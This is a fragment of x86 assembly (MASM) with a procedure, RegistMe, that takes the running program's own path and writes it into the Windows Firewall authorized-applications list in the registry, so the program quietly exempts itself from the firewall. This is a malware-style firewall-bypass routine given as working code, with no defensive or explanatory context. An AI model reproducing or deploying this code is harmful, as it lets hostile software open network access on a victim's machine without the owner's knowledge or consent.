.data
szAllowListKey  db "SYSTEM\ControlSet001\Services\SharedAccess\Parameters\FirewallPolicy\StandardProfile\AuthorizedApplications\List\",0
szDopPar	db ":*:Enabled:",0

.data?
sBuff  		db 	1024 dup(?) 
szMyKey	 	db      1024 dup(?)
szMyKey2	db      1024 dup(?)
lpFileShortName db      1024 dup(?)
.code

RegistMe proc
	invoke GetModuleFileName, NULL, OFFSET sBuff, 01000h
	test eax, eax
	jz @exit
	lea edx, [eax+sBuff-1]
@@:
       cmp BYTE PTR [edx], '.'
       je @F
       dec edx
       jmp @B
@@:
       mov BYTE PTR [edx], 0
@@:
       cmp BYTE PTR [edx-1], '\'
       je @F
       dec edx
       jmp @B
@@:
        invoke lstrcat,offset lpFileShortName,edx
        invoke GetModuleFileName, NULL, offset szMyKey, 256
        invoke lstrcpy,offset szMyKey2,offset szMyKey
        invoke lstrcat,offset szMyKey,offset szDopPar
	invoke lstrcat,offset szMyKey,offset lpFileShortName
	invoke RegOpenKeyEx, HKEY_LOCAL_MACHINE, addr szAllowListKey, 0, KEY_WRITE, addr hKey
	invoke lstrlen, addr szMyKey
	invoke RegSetValueEx, hKey, addr szMyKey2, 0, REG_SZ, addr szMyKey, eax
	invoke RegCloseKey, hKey
@exit:
        ret
RegistMe endp